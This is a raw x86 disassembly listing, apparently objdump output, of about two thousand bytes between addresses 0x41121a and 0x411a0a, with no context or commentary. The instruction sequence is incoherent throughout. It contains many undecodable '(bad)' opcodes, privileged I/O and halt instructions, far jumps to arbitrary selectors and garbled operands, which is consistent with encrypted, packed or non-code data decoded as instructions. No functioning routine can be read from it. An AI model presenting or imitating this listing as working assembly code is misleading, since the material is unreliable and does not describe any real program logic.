  41121a:	leave  
  41121b:	das    
  41121c:	pop    ebx
  41121d:	les    esi,FWORD PTR [esi]
  41121f:	push   ecx
  411220:	xchg   DWORD PTR [ecx+edx*8-0x4ced88b2],edx
  411227:	jmp    0x411204
  411229:	outs   dx,DWORD PTR ds:[esi]
  41122a:	neg    BYTE PTR [eax-0x6989b0cd]
  411230:	call   0x8871dc44
  411235:	xor    al,0xc
  411237:	into   
  411238:	xor    ebx,DWORD PTR [ecx]
  41123a:	xor    bl,BYTE PTR [ebx-0x19]
  41123d:	mov    al,0x68
  41123f:	sub    DWORD PTR [esi],eax
  411241:	cmp    BYTE PTR [edi-0x65],dl
  411244:	sub    eax,0x735bd045
  411249:	pop    edi
  41124a:	xchg   DWORD PTR [esi-0x3bf94f37],ecx
  411250:	scas   eax,DWORD PTR es:[edi]
  411251:	cmp    dh,dh
  411253:	mov    ds:0x2360394a,eax
  411258:	or     edi,DWORD PTR [esi-0x55]
  41125b:	repnz pop ds
  41125d:	inc    ebx
  41125e:	pop    eax
  41125f:	ss dec esp
  411261:	lods   eax,DWORD PTR ds:[esi]
  411262:	retf   
  411263:	add    ecx,edi
  411265:	xchg   ebx,eax
  411266:	xor    eax,DWORD PTR [ecx]
  411268:	jo     0x41123e
  41126a:	mov    ecx,0x23ffd57f
  41126f:	lea    edi,[edi-0x24697bb3]
  411275:	clc    
  411276:	outs   dx,BYTE PTR ds:[esi]
  411277:	or     ah,BYTE PTR [edx-0x7e72e803]
  41127d:	adc    al,0xf5
  41127f:	fsubr  QWORD PTR [ebp-0x5e7194eb]
  411285:	jle    0x411231
  411287:	inc    ebp
  411288:	mov    ds:0x17ad0747,al
  41128d:	inc    ebx
  41128e:	test   eax,0x99bb6e73
  411293:	dec    ecx
  411294:	retf   
  411295:	push   ss
  411296:	cmc    
  411297:	pop    ecx
  411298:	mov    cl,0xf
  41129a:	sub    esp,ebx
  41129c:	ds mov dl,0xdc
  41129f:	sbb    al,0x0
  4112a1:	or     ebx,DWORD PTR [ebx+0x70]
  4112a4:	mov    ecx,0x829fef68
  4112a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112aa:	test   DWORD PTR [edi],esp
  4112ac:	push   0xffffffc5
  4112ae:	cmp    edx,DWORD PTR [esp+edi*4-0x1d]
  4112b2:	inc    esi
  4112b3:	pop    edx
  4112b4:	and    DWORD PTR [edx+esi*8],eax
  4112b7:	dec    edi
  4112b8:	hlt    
  4112b9:	jo     0x41131f
  4112bb:	dec    ecx
  4112bc:	sbb    eax,0xd631313f
  4112c1:	jg     0x411319
  4112c3:	test   bl,0x67
  4112c6:	aas    
  4112c7:	xchg   ebx,eax
  4112c8:	fcmove st,st(0)
  4112ca:	mov    BYTE PTR [ebp+0x59],bh
  4112cd:	fs add al,0xc
  4112d0:	jmp    0x41132b
  4112d2:	xor    ah,BYTE PTR [esi]
  4112d4:	pop    ebx
  4112d5:	mov    ah,0x6b
  4112d7:	jle    0x4112b6
  4112d9:	aaa    
  4112da:	mov    ch,0x1a
  4112dc:	adc    al,0x31
  4112de:	and    edi,DWORD PTR [edi]
  4112e0:	mov    dl,0xf7
  4112e2:	mov    eax,0xdf95aa14
  4112e7:	enter  0x1caf,0x4b
  4112eb:	cwde   
  4112ec:	jnp    0x411283
  4112ee:	(bad)  
  4112ef:	repnz xchg esi,eax
  4112f1:	or     eax,0xdd01f449
  4112f6:	test   eax,0x6a41195e
  4112fb:	jne    0x41131d
  4112fd:	fcmovne st,st(7)
  4112ff:	pop    ebp
  411300:	dec    ebx
  411301:	push   ds
  411302:	push   edx
  411303:	push   ss
  411304:	(bad)  
  411305:	(bad)  [eax+0x7807cf58]
  41130b:	inc    ebp
  41130c:	push   0x31
  41130e:	push   es
  41130f:	mov    edi,0x67d8d013
  411314:	lods   al,BYTE PTR ds:[esi]
  411315:	or     ah,BYTE PTR [eax-0x440525dd]
  41131b:	aas    
  41131c:	push   ds
  41131d:	jne    0x4112c3
  41131f:	push   ds
  411320:	fdivp  st(2),st
  411322:	dec    ebp
  411323:	pop    eax
  411324:	and    DWORD PTR [ecx+0x5898929e],edx
  41132a:	bound  ecx,QWORD PTR [esi]
  41132c:	mov    ecx,0xe8c419d1
  411331:	or     al,0x88
  411333:	add    eax,0xe8a1e87
  411338:	xchg   BYTE PTR [esp+ebp*2-0x4a449884],bh
  41133f:	imul   esi,DWORD PTR [eax],0xfffffffe
  411342:	fist   DWORD PTR [edx-0x7e17290e]
  411348:	jne    0x411310
  41134a:	mov    al,ds:0x27b17b7d
  41134f:	fidiv  WORD PTR [ecx+esi*1-0x77]
  411353:	cmp    BYTE PTR [ecx+0x59],bh
  411356:	test   DWORD PTR [edi-0x21a21edc],0xa09a9ede
  411360:	cmp    al,0x51
  411362:	pop    esp
  411363:	daa    
  411364:	sahf   
  411365:	int    0xcb
  411367:	mov    al,0xc0
  411369:	out    dx,al
  41136a:	pop    es
  41136b:	inc    esp
  41136c:	add    bh,BYTE PTR [esi]
  41136e:	fcom   DWORD PTR [edi-0xc898ed6]
  411374:	fidivr DWORD PTR [esi+0x33bb081e]
  41137a:	pushf  
  41137b:	fsubr  st,st(1)
  41137d:	sbb    edx,DWORD PTR [edi]
  41137f:	dec    ecx
  411380:	pop    eax
  411381:	ss adc eax,0xb6647654
  411387:	lds    edi,FWORD PTR [eax+0x7017fbfb]
  41138d:	sbb    eax,0x209239fb
  411392:	inc    edx
  411393:	mov    eax,0xe747676b
  411398:	leave  
  411399:	jnp    0x4113a9
  41139b:	lea    ebp,[ebp-0x10e63ee3]
  4113a1:	(bad)  
  4113a2:	xor    eax,DWORD PTR [esi+0x72]
  4113a5:	mov    eax,DWORD PTR [esp+esi*2-0x65]
  4113a9:	ds pop edx
  4113ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113ac:	shr    ebx,1
  4113ae:	mov    fs,edx
  4113b0:	and    ebp,edx
  4113b2:	mov    ch,0x12
  4113b4:	jnp    0x411394
  4113b6:	clc    
  4113b7:	mov    ebp,0x548df543
  4113bc:	push   ecx
  4113bd:	shr    DWORD PTR [eax+ecx*8],0x24
  4113c1:	repz out 0x1c,eax
  4113c4:	mov    esi,0x1a29d8ea
  4113c9:	adc    DWORD PTR [ecx],ebp
  4113cb:	ss xchg edx,eax
  4113cd:	inc    ebp
  4113ce:	pop    edi
  4113cf:	pusha  
  4113d0:	adc    eax,0x42c5171a
  4113d5:	ins    BYTE PTR es:[edi],dx
  4113d6:	rcl    DWORD PTR [esi+edx*8+0x2d9b72d],cl
  4113dd:	aaa    
  4113de:	mov    bh,0x60
  4113e0:	ficom  DWORD PTR [ebx+0x24c6215b]
  4113e6:	pop    ebx
  4113e7:	lahf   
  4113e8:	daa    
  4113e9:	dec    edi
  4113ea:	mov    WORD PTR [esi],gs
  4113ec:	ja     0x4113f5
  4113ee:	jge    0x41139f
  4113f0:	std    
  4113f1:	jno    0x411450
  4113f3:	popa   
  4113f4:	clc    
  4113f5:	mov    ecx,DWORD PTR [ebp+0x2febf6e]
  4113fb:	mov    cl,0xf1
  4113fd:	popw   es
  4113ff:	jnp    0x411411
  411401:	cmpxchg dh,bl
  411404:	jp     0x4113e7
  411406:	ret    
  411407:	mov    ds:0xf7562c73,eax
  41140c:	out    dx,eax
  41140d:	ficom  DWORD PTR [edx+esi*2-0x27]
  411411:	js     0x41148e
  411413:	adc    al,0xd
  411415:	ins    BYTE PTR es:[edi],dx
  411416:	mov    esp,0xbdff0bcb
  41141b:	dec    edx
  41141c:	ins    BYTE PTR es:[edi],dx
  41141d:	arpl   WORD PTR [ebx+0x7755cda4],bx
  411423:	mov    ds:0x529dbe3d,eax
  411428:	jae    0x4113de
  41142a:	sbb    al,0xc9
  41142c:	mov    es,esi
  41142e:	xchg   ebx,eax
  41142f:	or     al,0x7d
  411431:	les    eax,FWORD PTR [edx-0x4f]
  411434:	int3   
  411435:	pop    ds
  411436:	(bad)  
  411437:	ss dec ebx
  411439:	hlt    
  41143a:	add    ecx,ebx
  41143c:	mov    dh,0xf9
  41143e:	mov    dl,0xb1
  411440:	loopne 0x4114b1
  411442:	adc    BYTE PTR [edx],0xda
  411445:	stos   BYTE PTR es:[edi],al
  411446:	bswap  ebp
  411448:	repz mov edx,0x71d396a3
  41144e:	ins    BYTE PTR es:[edi],dx
  41144f:	outs   dx,BYTE PTR ds:[esi]
  411450:	fwait
  411451:	cld    
  411452:	add    edi,DWORD PTR [edx-0x7a]
  411455:	xchg   ecx,eax
  411456:	mov    BYTE PTR [ebp-0x78],0x84
  41145a:	adc    esi,eax
  41145c:	push   edx
  41145d:	push   eax
  41145e:	and    BYTE PTR [eax],0xb
  411461:	aaa    
  411462:	fdivr  DWORD PTR [edi*1+0x65754811]
  411469:	int3   
  41146a:	repnz aad 0xcc
  41146d:	jp     0x4114c0
  41146f:	inc    edi
  411470:	xchg   ecx,eax
  411471:	fld    QWORD PTR [ebx+0x4f9e0428]
  411477:	mov    BYTE PTR [ecx-0x629fc033],0x77
  41147e:	sbb    al,ah
  411480:	dec    eax
  411481:	stos   BYTE PTR es:[edi],al
  411482:	jns    0x4114ca
  411484:	nop
  411485:	lock xchg edx,eax
  411487:	or     eax,0xa25ceaa2
  41148c:	cs and esp,eax
  41148f:	or     eax,0x55314331
  411494:	sar    BYTE PTR ds:0x50ebe84,0x37
  41149b:	mov    edx,0x20be0613
  4114a0:	repz xor BYTE PTR [eax+0x4cf25254],ah
  4114a7:	inc    esi
  4114a8:	retf   
  4114a9:	dec    ebx
  4114aa:	in     eax,dx
  4114ab:	push   cs
  4114ac:	stos   BYTE PTR es:[edi],al
  4114ad:	popa   
  4114ae:	sbb    eax,0x5e4f881
  4114b3:	pop    DWORD PTR [esi+0x67cc916]
  4114b9:	imul   esi,DWORD PTR [esi-0x30],0xffffff93
  4114bd:	sahf   
  4114be:	(bad)  
  4114bf:	cmp    edx,DWORD PTR [ebx]
  4114c1:	sahf   
  4114c2:	mov    dh,0xc1
  4114c4:	xchg   ecx,eax
  4114c5:	mov    bl,0x3f
  4114c7:	xchg   edi,eax
  4114c8:	repz jae 0x41146d
  4114cb:	jns    0x41150d
  4114cd:	jo     0x4114bf
  4114cf:	fcomip st,st(5)
  4114d1:	scas   eax,DWORD PTR es:[edi]
  4114d2:	and    BYTE PTR [edi+eiz*8-0x4a6259c2],0xab
  4114da:	sub    DWORD PTR [eax+0x4e],edi
  4114dd:	bound  edi,QWORD PTR [esi]
  4114df:	loop   0x411511
  4114e1:	adc    bl,BYTE PTR [ebx]
  4114e3:	mov    eax,0xb7f30659
  4114e8:	shl    DWORD PTR [edx+ebp*1],1
  4114eb:	jno    0x411470
  4114ed:	shl    DWORD PTR [edx],1
  4114ef:	pusha  
  4114f0:	das    
  4114f1:	cmp    eax,0x2e6fc52d
  4114f6:	jl     0x411509
  4114f8:	sti    
  4114f9:	aam    0xdb
  4114fb:	pop    esp
  4114fc:	mov    al,0x3e
  4114fe:	test   eax,0xc61bc79
  411503:	jl     0x411498
  411505:	add    esi,DWORD PTR [esi+0x77]
  411508:	jmp    0xc6c48165
  41150d:	push   ecx
  41150e:	dec    ecx
  41150f:	and    bl,BYTE PTR [ecx-0x1]
  411512:	popa   
  411513:	mov    bh,ah
  411515:	sub    BYTE PTR [ebp-0x374b158a],cl
  41151b:	xchg   esp,eax
  41151c:	xchg   ebx,eax
  41151d:	or     dh,BYTE PTR ds:0x9b95100e
  411523:	sbb    bh,dl
  411525:	add    eax,0xc3dbb7e2
  41152a:	cmp    al,0xa8
  41152c:	cmp    dl,BYTE PTR [ecx+0x48]
  41152f:	jbe    0x4114ca
  411531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411532:	into   
  411533:	mov    al,ds:0x53523693
  411538:	lea    edi,[ecx-0x23ad4d6e]
  41153e:	adc    BYTE PTR [ebp-0x35199048],dh
  411544:	jb     0x4114d4
  411546:	add    cl,ah
  411548:	fild   DWORD PTR [ebp+0x6714b490]
  41154e:	jbe    0x3368aea4
  411554:	in     eax,dx
  411555:	cmp    eax,0x9cc58294
  41155a:	inc    edx
  41155b:	test   BYTE PTR [edx],cl
  41155d:	jmp    0x411515
  41155f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411560:	push   cs
  411561:	cli    
  411562:	xchg   esp,eax
  411563:	aad    0x9d
  411565:	pushf  
  411566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411567:	fldcw  WORD PTR [edx]
  411569:	jecxz  0x41151f
  41156b:	ds mov ch,0x9f
  41156e:	cld    
  41156f:	add    BYTE PTR [edi+0x71c53295],bl
  411575:	xchg   edi,eax
  411576:	cmp    eax,0x9505efdd
  41157b:	or     eax,0xbd834ab5
  411580:	jno    0x411555
  411582:	jl     0x4115e6
  411584:	js     0x411553
  411586:	ins    BYTE PTR es:[edi],dx
  411587:	enter  0x2fd1,0xa
  41158b:	cmc    
  41158c:	pop    ss
  41158d:	imul   DWORD PTR [edi-0xa]
  411590:	pop    esi
  411591:	mov    ecx,0x3a6893e4
  411596:	xchg   esi,eax
  411597:	je     0x411520
  411599:	mov    ch,0x47
  41159b:	popa   
  41159c:	xlat   BYTE PTR ds:[ebx]
  41159d:	call   0xecdd:0x9e020ba5
  4115a4:	fdivr  QWORD PTR [edx-0x48]
  4115a7:	add    DWORD PTR [esi],ecx
  4115a9:	(bad)  
  4115aa:	lods   eax,DWORD PTR ds:[esi]
  4115ab:	dec    esi
  4115ac:	in     eax,0x86
  4115ae:	sar    BYTE PTR [edi],0x49
  4115b1:	mov    ds:0xb4e4db9e,eax
  4115b6:	aad    0x8b
  4115b8:	mov    esp,0x4efb78bb
  4115bd:	pop    esp
  4115be:	leave  
  4115bf:	pusha  
  4115c0:	cmp    eax,0x6de77703
  4115c5:	pop    es
  4115c6:	dec    ebp
  4115c7:	adc    eax,0x8f960627
  4115cc:	ret    0x2150
  4115cf:	sbb    DWORD PTR cs:[edx+0x33],0x614fccdd
  4115d7:	addr16 jne 0x4115d9
  4115da:	stos   BYTE PTR es:[edi],al
  4115db:	jno    0x41160f
  4115dd:	fdivr  QWORD PTR [ebx]
  4115df:	mov    eax,DWORD PTR [esi+0x1f6793ce]
  4115e5:	out    0xa8,al
  4115e7:	pop    es
  4115e8:	ins    DWORD PTR es:[edi],dx
  4115e9:	jbe    0x4115aa
  4115eb:	fsubr  QWORD PTR [esi+0x54]
  4115ee:	pop    edi
  4115ef:	inc    edi
  4115f0:	(bad)  
  4115f2:	jnp    0x4115b1
  4115f4:	imul   ebx,DWORD PTR [ecx+ecx*2],0xa
  4115f8:	mov    DWORD PTR [edi],ebx
  4115fa:	iret   
  4115fb:	shl    esi,1
  4115fd:	inc    ecx
  4115fe:	call   0x377ca9df
  411603:	dec    edx
  411604:	sub    eax,0x19ee375
  411609:	dec    edi
  41160a:	inc    ebp
  41160b:	jle    0x411616
  41160d:	outs   dx,DWORD PTR ds:[esi]
  41160e:	sbb    eax,0xb165179c
  411613:	test   eax,0xa1736775
  411618:	int3   
  411619:	pop    ds
  41161a:	aaa    
  41161b:	fidivr DWORD PTR [edi]
  41161d:	and    esp,ebp
  41161f:	mov    esi,0x53a69a2a
  411624:	inc    ebx
  411625:	adc    ecx,DWORD PTR [edx+ebp*1+0x190282bb]
  41162c:	jne    0x411688
  41162e:	test   BYTE PTR [edx],ah
  411630:	in     eax,dx
  411631:	mov    cl,0xad
  411633:	dec    edi
  411634:	setb   BYTE PTR [edi-0x71]
  411638:	sub    bl,BYTE PTR [edi+0x8a39592]
  41163e:	loopne 0x4115f9
  411640:	test   al,0xb7
  411642:	loop   0x411637
  411644:	fs jbe 0x4116c1
  411647:	mov    BYTE PTR [ebx+0x39],dl
  41164a:	repnz (bad) 
  41164c:	je     0x4116b0
  41164e:	mov    edx,edx
  411650:	mov    DWORD PTR [ecx-0x14dd1037],esi
  411656:	pop    ebx
  411657:	dec    esp
  411658:	push   ecx
  411659:	mov    edi,DWORD PTR [edx]
  41165b:	mov    ecx,0x441f0738
  411660:	jb     0x4116b5
  411662:	ret    
  411663:	push   cs
  411664:	adc    BYTE PTR [eax+0x72],bh
  411667:	lock cmp bl,al
  41166a:	call   0x44b4e47e
  41166f:	imul   DWORD PTR [esi]
  411671:	inc    eax
  411672:	dec    ecx
  411673:	push   eax
  411674:	mov    ah,0xfc
  411676:	mov    ebx,0x6bc1fe2e
  41167b:	(bad)  
  41167c:	or     bh,bl
  41167e:	int3   
  41167f:	das    
  411680:	fld    DWORD PTR [edx-0x79]
  411683:	retf   0x905b
  411686:	ins    BYTE PTR es:[edi],dx
  411687:	add    ch,dh
  411689:	xchg   BYTE PTR [ebx],bh
  41168b:	scas   al,BYTE PTR es:[edi]
  41168c:	outs   dx,BYTE PTR ds:[esi]
  41168d:	loope  0x4116e4
  41168f:	push   edx
  411690:	shr    BYTE PTR [edx+0x7c],0x89
  411694:	lock (bad) [ecx]
  411697:	call   0xf064261e
  41169c:	dec    edi
  41169d:	test   DWORD PTR [ebx],0x616cae2a
  4116a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116a4:	adc    al,0x6d
  4116a6:	cdq    
  4116a7:	add    edx,eax
  4116a9:	mov    eax,ds:0x7940384b
  4116ae:	and    eax,0xf0369d38
  4116b3:	dec    edi
  4116b4:	ja     0x41170b
  4116b6:	xchg   ebp,eax
  4116b7:	popf   
  4116b8:	das    
  4116b9:	sbb    BYTE PTR [edi-0x76],0x91
  4116bd:	lods   eax,DWORD PTR ds:[esi]
  4116be:	sub    ebx,DWORD PTR [ebx-0x6a3d6161]
  4116c4:	jp     0x411660
  4116c6:	cmc    
  4116c7:	(bad)  
  4116c8:	fbstp  TBYTE PTR [ecx+0x63cd4661]
  4116ce:	mov    ah,0x70
  4116d0:	adc    al,0xf
  4116d2:	fsub   st,st(5)
  4116d4:	aas    
  4116d5:	fbld   TBYTE PTR [ebx]
  4116d7:	(bad)  
  4116d8:	cmc    
  4116d9:	imul   ebx,ebx,0xffffffdc
  4116dc:	cmc    
  4116dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116de:	mov    ch,0x75
  4116e0:	(bad)  
  4116e1:	stos   DWORD PTR es:[edi],eax
  4116e2:	es pop esp
  4116e4:	xlat   BYTE PTR ds:[ebx]
  4116e5:	pusha  
  4116e6:	dec    ecx
  4116e7:	inc    ebx
  4116e8:	bound  edi,QWORD PTR [edi-0x7796a281]
  4116ee:	cwde   
  4116ef:	push   es
  4116f0:	xchg   ebx,eax
  4116f1:	push   cs
  4116f2:	sahf   
  4116f3:	pusha  
  4116f4:	dec    edi
  4116f5:	xor    DWORD PTR [edx+esi*2+0x2248be03],edx
  4116fc:	and    DWORD PTR [ecx-0x23],ecx
  4116ff:	loopne 0x411699
  411701:	mov    ds:0x5a48ff6a,eax
  411706:	(bad)  
  411708:	push   cs
  411709:	jo     0x411757
  41170b:	mov    bl,0x6f
  41170d:	inc    esp
  41170e:	pop    esi
  41170f:	pop    ss
  411710:	inc    ebp
  411711:	mov    al,0xd8
  411713:	clc    
  411714:	and    DWORD PTR [esi],edi
  411716:	shl    BYTE PTR [esi+0xb],1
  411719:	xchg   ecx,eax
  41171a:	sahf   
  41171b:	mov    eax,0xa4e261d9
  411720:	jb     0x4116ee
  411722:	popf   
  411723:	pop    ebp
  411724:	sbb    BYTE PTR [eax],0x58
  411727:	inc    ebx
  411728:	jne    0x4116cc
  41172a:	cmp    DWORD PTR [eax],eax
  41172c:	stos   DWORD PTR es:[edi],eax
  41172d:	mov    eax,ds:0xf71f887d
  411732:	push   ss
  411733:	add    BYTE PTR [ecx],dh
  411735:	pop    ss
  411736:	leave  
  411737:	sub    ebp,DWORD PTR [eax]
  411739:	(bad)  
  41173a:	out    dx,al
  41173b:	mov    bl,cl
  41173d:	bound  esp,QWORD PTR [edi-0x1f346231]
  411743:	(bad)
  411747:	xor    eax,0x6d878f34
  41174c:	test   dl,dl
  41174e:	sbb    ebx,DWORD PTR [edx+0x17]
  411751:	call   0xa7a0c61c
  411756:	push   ebp
  411757:	cli    
  411758:	rol    DWORD PTR [ebx+0x37c5fe42],0x6a
  41175f:	jo     0x4117ae
  411761:	rcr    BYTE PTR [eax+0x1974d11e],cl
  411767:	xchg   dh,bl
  411769:	mov    edx,0x43f86b9b
  41176e:	loop   0x411781
  411770:	jl     0x411774
  411772:	xchg   edi,eax
  411773:	dec    ebp
  411774:	mov    ebx,0xf6c23acc
  411779:	ror    esi,cl
  41177b:	cs js  0x41179c
  41177e:	addr16 mov edi,0x3fcf6e05
  411784:	pushf  
  411785:	clc    
  411786:	add    BYTE PTR [eax+0x369873bb],bl
  41178c:	pop    edi
  41178d:	loop   0x4117f3
  41178f:	mov    al,ds:0x7f26627
  411794:	retf   0x7d0e
  411797:	add    BYTE PTR [esp+edx*4+0x6f],al
  41179b:	jne    0x41180a
  41179d:	mov    ss,WORD PTR [edx-0x5bdcc649]
  4117a3:	or     BYTE PTR [edx],dl
  4117a5:	or     edx,DWORD PTR [eax-0xc9f320d]
  4117ab:	mov    ecx,0x726e5146
  4117b0:	mov    ebp,0x3f0dce5
  4117b5:	(bad)  
  4117b7:	add    eax,DWORD PTR [edx-0x181c1b19]
  4117bd:	jns    0x41179c
  4117bf:	fcmovnu st,st(7)
  4117c1:	add    BYTE PTR [ebp+0x72],dh
  4117c4:	pusha  
  4117c5:	out    0xce,al
  4117c7:	call   0x7cda:0xf64c3893
  4117ce:	push   eax
  4117cf:	mov    dl,0xc5
  4117d1:	jmp    0xd803d374
  4117d6:	pop    eax
  4117d7:	or     ch,cl
  4117d9:	loop   0x411812
  4117db:	and    bl,bh
  4117dd:	sub    al,BYTE PTR [ebx]
  4117df:	push   0xa94adfb7
  4117e4:	mov    al,ds:0xc8c071dc
  4117e9:	sahf   
  4117ea:	ins    BYTE PTR es:[edi],dx
  4117eb:	mov    ah,0xa
  4117ed:	or     ch,dl
  4117ef:	pop    edx
  4117f0:	inc    edi
  4117f1:	adc    DWORD PTR [ebx+0x1b789e66],esi
  4117f7:	xchg   edx,eax
  4117f8:	sbb    edi,DWORD PTR [ecx]
  4117fa:	or     BYTE PTR [edx+0x32ed363d],cl
  411800:	stos   BYTE PTR es:[edi],al
  411801:	jp     0x41187d
  411803:	test   DWORD PTR [ebp-0x60d586f2],eax
  411809:	js     0x411794
  41180b:	jne    0x4117f9
  41180d:	mov    ebp,0x80009acf
  411812:	add    al,0x36
  411814:	ror    DWORD PTR [ebx-0x2a],1
  411817:	std    
  411818:	fadd   st,st(2)
  41181a:	xor    edi,DWORD PTR [edx+0x159bdc96]
  411820:	mov    al,dl
  411822:	push   edx
  411823:	stos   DWORD PTR es:[edi],eax
  411824:	int    0x1d
  411826:	pop    edi
  411827:	pop    edi
  411828:	push   edi
  411829:	fisubr WORD PTR [ebp-0x2f]
  41182c:	sub    cl,BYTE PTR [ebx]
  41182e:	adc    esi,esp
  411830:	test   al,0x65
  411832:	push   ecx
  411833:	jns    0x411880
  411835:	inc    edi
  411836:	setnp  BYTE PTR ds:0xb0ec4c16
  41183d:	je     0x4118b2
  41183f:	mov    cl,0xf
  411841:	aad    0xd3
  411843:	mov    ds:0xc743aabf,eax
  411848:	pop    ds
  411849:	arpl   bp,bp
  41184b:	pop    edx
  41184c:	push   0xffffffc0
  41184e:	es in  eax,dx
  411850:	clc    
  411851:	arpl   WORD PTR [ebx],ax
  411853:	jns    0x4118be
  411855:	mov    esi,0xf2a56134
  41185a:	aas    
  41185b:	adc    BYTE PTR [ecx+0x34b215fe],al
  411861:	pop    esi
  411862:	les    eax,FWORD PTR [ecx]
  411864:	cmp    eax,0xbaf5c911
  411869:	and    eax,0xdabf3add
  41186e:	in     eax,0xa4
  411870:	mov    edi,0x46c777b4
  411875:	outs   dx,BYTE PTR ds:[esi]
  411876:	leave  
  411877:	pop    ss
  411878:	and    al,0xa7
  41187a:	shr    DWORD PTR [edx+0x386624cd],cl
  411880:	xor    DWORD PTR [edi-0x5e],edi
  411883:	pop    es
  411884:	push   ebx
  411885:	or     esp,DWORD PTR [esi]
  411887:	mov    ds:0xfee6706d,al
  41188c:	les    edi,FWORD PTR [ebp-0x6e]
  41188f:	dec    esp
  411890:	sahf   
  411891:	mov    al,ds:0xafca74b
  411896:	sbb    DWORD PTR [edx+0x6534e95c],ecx
  41189c:	inc    eax
  41189d:	dec    edi
  41189e:	inc    esp
  41189f:	hlt    
  4118a0:	sub    al,0xc
  4118a2:	jne    0x4118ba
  4118a4:	out    0xb,eax
  4118a6:	mov    al,ds:0x393c15f3
  4118ab:	pusha  
  4118ac:	or     BYTE PTR cs:[edi-0x5c695991],dl
  4118b3:	(bad)  
  4118b5:	inc    edi
  4118b6:	inc    esi
  4118b7:	mov    eax,0x4ae754ad
  4118bc:	out    0x0,al
  4118be:	into   
  4118bf:	sbb    eax,0x18db1811
  4118c4:	jmp    0xa478:0xdb2b9e74
  4118cb:	push   edi
  4118cc:	cmp    BYTE PTR [eax],0x3c
  4118cf:	mov    edi,0x2d571bd4
  4118d4:	mov    edx,0x39c4b825
  4118d9:	cli    
  4118da:	fisttp WORD PTR [ecx]
  4118dc:	(bad)  
  4118dd:	mov    al,ds:0x3c3a235f
  4118e2:	cmc    
  4118e3:	xor    DWORD PTR [eax],ebx
  4118e5:	sub    bl,ch
  4118e7:	inc    esi
  4118e8:	dec    esp
  4118e9:	movntq (bad),mm3
  4118ea:	out    0xdf,eax
  4118ec:	xor    eax,DWORD PTR [edi]
  4118ee:	mov    ah,0xf6
  4118f0:	jne    0x411942
  4118f2:	das    
  4118f3:	adc    al,0xc4
  4118f5:	jge    0x411923
  4118f7:	mov    cl,0xa1
  4118f9:	in     eax,dx
  4118fa:	stos   BYTE PTR es:[edi],al
  4118fb:	bound  esp,QWORD PTR [edx+0x4fa5979]
  411901:	js     0x411925
  411903:	sbb    al,0x22
  411905:	mov    bl,0xcc
  411907:	mov    ch,0xbc
  411909:	shl    BYTE PTR [esi-0x7a],1
  41190c:	or     al,0x19
  41190e:	cmp    al,0x6d
  411910:	rcr    ebx,0x4
  411913:	sbb    al,0x34
  411915:	fsubp  st(3),st
  411917:	push   ds
  411918:	ins    DWORD PTR es:[edi],dx
  411919:	pushf  
  41191a:	dec    eax
  41191b:	and    ebp,DWORD PTR ds:0xb8562151
  411921:	test   al,0xff
  411923:	popf   
  411924:	sub    eax,0x5c9b849a
  411929:	out    dx,al
  41192a:	ficom  DWORD PTR [ecx+0x6b]
  41192d:	dec    ecx
  41192e:	pop    ebp
  41192f:	cld    
  411930:	mov    bh,0x33
  411932:	mov    ss,WORD PTR ds:[edx]
  411935:	mov    ds,WORD PTR [esi-0x29cb918b]
  41193b:	fcmovu st,st(3)
  41193d:	scas   eax,DWORD PTR es:[edi]
  41193e:	(bad)  
  41193f:	sar    bl,0x3d
  411942:	pop    DWORD PTR [edx-0x3f]
  411945:	push   es
  411946:	sub    esp,ecx
  411948:	adc    bh,BYTE PTR [edx+0x508850b]
  41194e:	sbb    al,0x3e
  411950:	add    al,0xc2
  411952:	(bad)  
  411953:	mov    ecx,0xc2dc176d
  411958:	aam    0x3
  41195a:	xor    al,0x18
  41195c:	aas    
  41195d:	jle    0x411961
  41195f:	in     eax,0x33
  411961:	mov    bl,0x73
  411963:	ins    DWORD PTR es:[edi],dx
  411964:	retf   0x23ae
  411967:	pop    es
  411968:	xchg   ecx,eax
  411969:	xlat   BYTE PTR ds:[ebx]
  41196a:	and    ch,ah
  41196c:	minps  xmm7,XMMWORD PTR [ebp-0x21]
  411970:	call   0xbc2:0xca7a5813
  411977:	mov    bl,0x95
  411979:	das    
  41197a:	es xchg ebp,eax
  41197c:	outs   dx,DWORD PTR ds:[esi]
  41197d:	aad    0x93
  41197f:	int3   
  411980:	inc    eax
  411981:	out    dx,eax
  411982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411983:	fisubr DWORD PTR es:0xc6cd9980
  41198a:	cmp    ch,BYTE PTR [edx+0xe364464]
  411990:	in     eax,0xc7
  411992:	xor    eax,0xe7f8aa6f
  411997:	dec    esi
  411998:	bound  ecx,QWORD PTR [edi+ebp*8]
  41199b:	or     DWORD PTR [ebx],ebp
  41199d:	pushf  
  41199e:	mov    edi,0x867ebb8c
  4119a3:	cmp    bh,BYTE PTR ds:0x652a2db4
  4119a9:	or     DWORD PTR [esi-0x3e],edx
  4119ac:	(bad)  
  4119ad:	pop    edi
  4119ae:	call   0xeaedd4d
  4119b3:	nop
  4119b4:	loop   0x4119c5
  4119b6:	mov    ?,WORD PTR [esi-0x4b]
  4119b9:	cmp    eax,0x11eb936c
  4119be:	lds    ebx,FWORD PTR [ecx+0x78023d6b]
  4119c4:	add    DWORD PTR [ebp-0x43b512ba],ebx
  4119ca:	and    al,0xaf
  4119cc:	dec    edi
  4119cd:	aaa    
  4119ce:	mov    cl,0x12
  4119d0:	loop   0x411962
  4119d2:	add    al,0x3f
  4119d4:	inc    ecx
  4119d5:	pop    esi
  4119d6:	xchg   ebp,eax
  4119d7:	idiv   eax
  4119d9:	mov    ds:0x9250af6d,al
  4119de:	sub    eax,0x2b2f6ba0
  4119e3:	add    eax,0x3b89181a
  4119e8:	ret    0xca1c
  4119eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119ec:	mov    ecx,0x756f012e
  4119f1:	xor    eax,0xfd9a53b9
  4119f6:	pop    ecx
  4119f7:	mov    eax,?
  4119f9:	xchg   edi,eax
  4119fa:	jb     0x411a22
  4119fc:	add    BYTE PTR [edi+0x12],cl
  4119ff:	jmp    0xe437:0x3a3d7866
  411a06:	inc    edx
  411a07:	mov    DWORD PTR [esi+0x36],ebp
  411a0a:	mov    bl,0xc3
